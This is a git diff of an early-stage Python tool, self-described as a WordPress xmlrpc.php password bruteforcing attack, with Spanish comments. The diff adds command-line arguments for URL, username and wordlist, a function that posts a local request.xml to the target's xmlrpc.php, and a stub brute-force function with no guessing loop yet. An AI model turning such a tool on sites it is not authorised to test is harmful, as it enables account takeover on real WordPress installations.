@@ -4,6 +4,8 @@ import signal
 from termcolor import colored
 import sys
 import argparse
+import os
+import requests
 
 
 # Ctrl_c
@@ -18,7 +20,7 @@ signal.signal(signal.SIGINT, def_handler)
 
 def get_arguments():
     parser = argparse.ArgumentParser(
-        description='evilXMLrpc passwd bruteforcing attack by liandd')
+        description=colored("evilXMLrpc bruteforcing attack", "green")+" by "+colored("liandd", "red"))
     parser.add_argument('-u', '--url', dest="URL",
                         help="WordPress URL to bruteforce (i.e --url http://127.0.0.1:31337)")
     parser.add_argument('-n', '--name', dest="NAME",
@@ -32,9 +34,27 @@ def get_arguments():
     return options.URL, options.NAME, options.WORDLIST
 
 
+def XMLrpc_ffuf(url):
+    """Revisar que la url tenga un xmlrpc.php valido !(tampered, disabled, hardcoded, not working)"""
+    url = url+'/xmlrpc.php'
+    if os.path.exists("request.xml"):
+        with open("request.xml", "rb") as xml_request:
+            file = {"Request": xml_request}
+            response = requests.post(url, files=file)
+            print(colored(response.text, "red"))
+
+
+def XMLbrute_force(url, name, wordlist):
+    XMLrpc_ffuf(url)
+    """Revisa la estructura XML para identificar si es posible hacer el ataque"""
+    # xml_file = "file.xml"
+    # with open(xml_file, "rw") as xml:
+    #    xml.write()
+
+
 def main():
     URL, NAME, WORDLIST = get_arguments()
-    print(colored(f"Los argumentos son {URL}, {NAME}, {WORDLIST}", "green"))
+    XMLbrute_force(URL, NAME, WORDLIST)
     sys.exit(0)
 
 
